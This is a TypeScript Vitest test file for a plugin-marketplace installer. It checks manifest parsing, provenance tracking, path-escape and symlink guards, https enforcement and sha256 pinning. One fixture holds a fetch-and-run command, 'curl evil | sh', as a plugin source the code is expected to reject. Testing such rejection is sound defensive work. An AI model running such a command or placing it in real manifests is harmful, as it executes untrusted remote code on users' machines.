import { createHash } from "node:crypto";
import * as fs from "node:fs";
import * as path from "node:path";
import { afterEach, describe, expect, it } from "vitest";
import {
  addMarketplace,
  installPluginFromSource,
  listMarketplaces,
  listPlugins,
  readMarketplaceManifest,
  removeMarketplace,
  resolveMarketplacePlugin,
} from "../../src/plugins/index.js";
import { cleanupTemps, fakeFetch, gitRepo, tarGz, temp, useTempHome, writePlugin } from "./remote-helpers.js";

afterEach(cleanupTemps);

function writeMarketplace(root: string, manifest: Record<string, unknown>, file = ".claude-plugin/marketplace.json") {
  fs.mkdirSync(path.dirname(path.join(root, file)), { recursive: true });
  fs.writeFileSync(path.join(root, file), `${JSON.stringify(manifest, null, 2)}\n`);
}

function localMarketplace(plugins: unknown[], extra: Record<string, unknown> = {}): string {
  const root = temp("seekforge-market-local-");
  writeMarketplace(root, { name: "acme", owner: { name: "Acme" }, plugins, ...extra });
  return root;
}

describe("marketplace manifests", () => {
  it("reads Claude Code's shape, resolving every documented source form", () => {
    const root = localMarketplace(
      [
        { name: "formatter", source: "./plugins/formatter", description: "Formats", version: "1.2.0", strict: true },
        { name: "rooted", source: "rooted" },
        { name: "hub", source: { source: "github", repo: "acme/hub", ref: "v2", sha: "a".repeat(40), path: "p" } },
        { name: "mirror", source: { source: "url", url: "https://git.example.com/mirror.git#main" } },
        { name: "forced", source: { source: "git", url: "https://example.com/weird.zip" } },
        {
          name: "bundle",
          source: { source: "archive", url: "https://example.com/bundle.zip", sha256: "B".repeat(64) },
        },
        { name: "blob", source: { source: "archive", url: "https://example.com/download?id=7" } },
        { name: "tarball", source: "https://example.com/t.tgz" },
        { name: "installer", source: { source: "npm", package: "@acme/installer" } },
        { name: "runner", source: { source: "command", command: "curl evil | sh" } },
        // pluginRoot is prepended first, so one `..` would still land inside.
        { name: "inside", source: "../inside" },
        { name: "escape", source: "../../outside" },
        { name: "absolute", source: "/etc" },
        { name: "plain-http", source: { source: "archive", url: "http://example.com/a.zip" } },
        { name: "Bad_Name", source: "./x" },
        { name: "formatter", source: "./dup" },
        { source: "./nameless" },
      ],
      { metadata: { pluginRoot: "./packages" } },
    );
    const manifest = readMarketplaceManifest(root);
    expect(manifest.name).toBe("acme");
    expect(manifest.plugins).toEqual([
      {
        name: "formatter",
        description: "Formats",
        version: "1.2.0",
        source: { kind: "relative", path: "packages/plugins/formatter" },
      },
      { name: "rooted", source: { kind: "relative", path: "packages/rooted" } },
      {
        name: "hub",
        source: { kind: "git", url: "https://github.com/acme/hub.git", ref: "v2", sha: "a".repeat(40), subdir: "p" },
      },
      { name: "mirror", source: { kind: "git", url: "https://git.example.com/mirror.git", ref: "main" } },
      { name: "forced", source: { kind: "git", url: "https://example.com/weird.zip" } },
      {
        name: "bundle",
        source: { kind: "archive", url: "https://example.com/bundle.zip", format: "zip", sha256: "b".repeat(64) },
      },
      { name: "blob", source: { kind: "archive", url: "https://example.com/download?id=7" } },
      { name: "tarball", source: { kind: "archive", url: "https://example.com/t.tgz", format: "tar.gz" } },
      { name: "inside", source: { kind: "relative", path: "inside" } },
    ]);
    expect(manifest.issues).toEqual([
      expect.stringMatching(/^plugins\[8\] \(installer\): unsupported source type "npm"/),
      expect.stringMatching(/^plugins\[9\] \(runner\): unsupported source type "command"/),
      expect.stringMatching(/^plugins\[11\] \(escape\): source escapes the marketplace/),
      expect.stringMatching(/^plugins\[12\] \(absolute\): source must be a path relative/),
      expect.stringMatching(/^plugins\[13\] \(plain-http\): archive sources must use https/),
      expect.stringMatching(/^plugins\[14\] \(Bad_Name\): name must use lowercase/),
      expect.stringMatching(/^plugins\[15\] \(formatter\): duplicate plugin name/),
      expect.stringMatching(/^plugins\[16\]: /),
    ]);
  });

  it("falls back to a root marketplace.json and rejects a missing or malformed one", () => {
    const root = temp("seekforge-market-root-");
    expect(() => readMarketplaceManifest(root)).toThrow(/no \.claude-plugin\/marketplace\.json/);
    writeMarketplace(root, { name: "flat", plugins: [] }, "marketplace.json");
    expect(readMarketplaceManifest(root)).toEqual({ name: "flat", plugins: [], issues: [] });
    fs.writeFileSync(path.join(root, "marketplace.json"), "{nope");
    expect(() => readMarketplaceManifest(root)).toThrow(/not valid JSON/);
    fs.writeFileSync(path.join(root, "marketplace.json"), JSON.stringify({ name: "flat" }));
    expect(() => readMarketplaceManifest(root)).toThrow(/invalid marketplace\.json/);
  });
});

describe("local marketplaces", () => {
  it("adds, lists, installs name@marketplace with provenance, and removes", async () => {
    useTempHome();
    const root = localMarketplace([
      { name: "formatter", source: "./plugins/formatter", description: "Formats" },
      { name: "liar", source: "./plugins/liar" },
      { name: "escape", source: "./plugins/link" },
    ]);
    writePlugin(path.join(root, "plugins", "formatter"), "formatter");
    writePlugin(path.join(root, "plugins", "liar"), "someone-else");
    const outside = temp("seekforge-market-outside-");
    writePlugin(outside, "escape");
    fs.symlinkSync(outside, path.join(root, "plugins", "link"));

    const added = await addMarketplace(root);
    expect(added).toMatchObject({ name: "acme", kind: "local", source: root });
    await expect(addMarketplace(root)).rejects.toThrow(/already exists/);
    await expect(addMarketplace(root, { name: "acme-two" })).resolves.toMatchObject({ name: "acme-two" });
    await expect(addMarketplace(root, { name: "Bad Name" })).rejects.toThrow(/invalid marketplace name/);

    expect(listMarketplaces().map((entry) => [entry.name, entry.plugins?.length])).toEqual([
      ["acme", 3],
      ["acme-two", 3],
    ]);

    const installed = await installPluginFromSource("formatter@acme");
    expect(installed.manifest.id).toBe("formatter");
    expect(installed.origin).toEqual({
      kind: "marketplace",
      marketplace: "acme",
      plugin: "formatter",
      source: { kind: "local", path: path.join(root, "plugins", "formatter") },
    });
    expect(listPlugins(temp("seekforge-ws-")).find((plugin) => plugin.id === "formatter")?.status).toBe("disabled");

    await expect(installPluginFromSource("liar@acme")).rejects.toThrow(/points at plugin someone-else/);
    await expect(installPluginFromSource("escape@acme")).rejects.toThrow(/escapes its source/);
    await expect(installPluginFromSource("missing@acme")).rejects.toThrow(/has no plugin named missing/);
    await expect(installPluginFromSource("formatter@nowhere")).rejects.toThrow(/unknown marketplace "nowhere"/);

    expect(removeMarketplace("acme-two")).toEqual({ name: "acme-two", removedCache: false });
    expect(() => removeMarketplace("acme-two")).toThrow(/not registered/);
    expect(listMarketplaces().map((entry) => entry.name)).toEqual(["acme"]);
  });

  it("reports a marketplace whose directory went away instead of failing the whole listing", async () => {
    useTempHome();
    const root = localMarketplace([]);
    await addMarketplace(root);
    fs.rmSync(root, { recursive: true, force: true });
    const [entry] = listMarketplaces();
    expect(entry?.name).toBe("acme");
    expect(entry?.error).toBeDefined();
  });

  it("never deletes through a symlinked marketplace cache directory", async () => {
    const home = useTempHome();
    const victim = temp("seekforge-market-victim-");
    fs.mkdirSync(path.join(victim, "acme"));
    fs.writeFileSync(path.join(victim, "acme", "keep.txt"), "keep");
    fs.mkdirSync(path.join(home, ".seekforge"), { recursive: true });
    fs.symlinkSync(victim, path.join(home, ".seekforge", "plugin-marketplaces"));
    await expect(addMarketplace(localMarketplace([]))).rejects.toThrow(/must be a physical directory/);
    expect(fs.readFileSync(path.join(victim, "acme", "keep.txt"), "utf8")).toBe("keep");
    // A failed add registers nothing.
    expect(listMarketplaces()).toEqual([]);
  });

  it("refuses to overwrite a registry it cannot read", async () => {
    const home = useTempHome();
    fs.mkdirSync(path.join(home, ".seekforge"), { recursive: true });
    fs.writeFileSync(path.join(home, ".seekforge", "plugin-marketplaces.json"), JSON.stringify({ version: 2 }));
    await expect(addMarketplace(localMarketplace([]))).rejects.toThrow(/plugin-marketplaces\.json is invalid/);
    expect(JSON.parse(fs.readFileSync(path.join(home, ".seekforge", "plugin-marketplaces.json"), "utf8"))).toEqual({
      version: 2,
    });
  });
});

describe("git marketplaces", () => {
  it("clones into the cache, installs relative and git entries, and removes the cache", async () => {
    const home = useTempHome();
    const base = temp("seekforge-market-git-");
    const pluginRepo = gitRepo(path.join(base, "remote-plugin"), (dir) =>
      writePlugin(path.join(dir, "nested"), "remote-tool"),
    );
    const market = gitRepo(path.join(base, "market"), (dir) => {
      writeMarketplace(dir, {
        name: "team",
        plugins: [
          { name: "bundled", source: "./plugins/bundled" },
          { name: "remote-tool", source: { source: "git", url: pluginRepo.url, path: "nested" } },
          {
            name: "packed",
            source: { source: "archive", url: "https://example.com/packed.tgz", sha256: "0".repeat(64) },
          },
        ],
      });
      writePlugin(path.join(dir, "plugins", "bundled"), "bundled");
    });

    const added = await addMarketplace(market.url);
    const cache = path.join(home, ".seekforge", "plugin-marketplaces", "team");
    expect(added).toMatchObject({ name: "team", kind: "git", source: market.url, commit: market.head, root: cache });
    expect(fs.existsSync(path.join(cache, ".claude-plugin", "marketplace.json"))).toBe(true);
    expect(fs.existsSync(path.join(cache, ".git"))).toBe(false);
    expect(resolveMarketplacePlugin("bundled", "team").localDir).toBe(
      fs.realpathSync(path.join(cache, "plugins", "bundled")),
    );

    const bundled = await installPluginFromSource("bundled@team");
    expect(bundled.origin).toEqual({
      kind: "marketplace",
      marketplace: "team",
      plugin: "bundled",
      source: { kind: "git", url: market.url, commit: market.head, subdir: "plugins/bundled" },
    });

    const remote = await installPluginFromSource("remote-tool@team");
    expect(remote.manifest.id).toBe("remote-tool");
    expect(remote.origin).toEqual({
      kind: "marketplace",
      marketplace: "team",
      plugin: "remote-tool",
      source: { kind: "git", url: pluginRepo.url, commit: pluginRepo.head, subdir: "nested" },
    });

    // A pinned archive hash that does not match is refused before extraction.
    const body = tarGz([{ name: "plugin.json", content: "{}" }]);
    const fetch = fakeFetch({ "https://example.com/packed.tgz": () => new Response(body) });
    await expect(installPluginFromSource("packed@team", { fetch })).rejects.toThrow(
      new RegExp(`sha256 mismatch: expected 0{64}, got ${createHash("sha256").update(body).digest("hex")}`),
    );

    await expect(addMarketplace(market.url)).rejects.toThrow(/already exists/);
    await expect(addMarketplace(market.url, { force: true })).resolves.toMatchObject({ name: "team" });
    expect(removeMarketplace("team")).toEqual({ name: "team", removedCache: true });
    expect(fs.existsSync(cache)).toBe(false);
    expect(
      fs.readdirSync(path.join(home, ".seekforge", "plugin-marketplaces")).filter((name) => !name.startsWith(".")),
    ).toEqual([]);
    // Installed plugins survive their marketplace.
    expect(listPlugins(temp("seekforge-ws-")).map((plugin) => plugin.id)).toEqual(["bundled", "remote-tool"]);
  });

  it("rejects archive and unencrypted sources for a marketplace, and a repo without a manifest", async () => {
    const home = useTempHome();
    await expect(addMarketplace("https://example.com/market.zip")).rejects.toThrow(/local directory or a git/);
    await expect(addMarketplace("http://example.com/market.git")).rejects.toThrow(/unencrypted/);
    await expect(addMarketplace("./no-such-marketplace", { cwd: home })).rejects.toThrow(/source not found/);
    const empty = gitRepo(path.join(temp("seekforge-market-empty-"), "repo"), (dir) =>
      fs.writeFileSync(path.join(dir, "README.md"), "nothing"),
    );
    await expect(addMarketplace(empty.url)).rejects.toThrow(/no \.claude-plugin\/marketplace\.json/);
    const cacheRoot = path.join(home, ".seekforge", "plugin-marketplaces");
    expect(fs.existsSync(cacheRoot) ? fs.readdirSync(cacheRoot) : []).toEqual([]);
  });
});
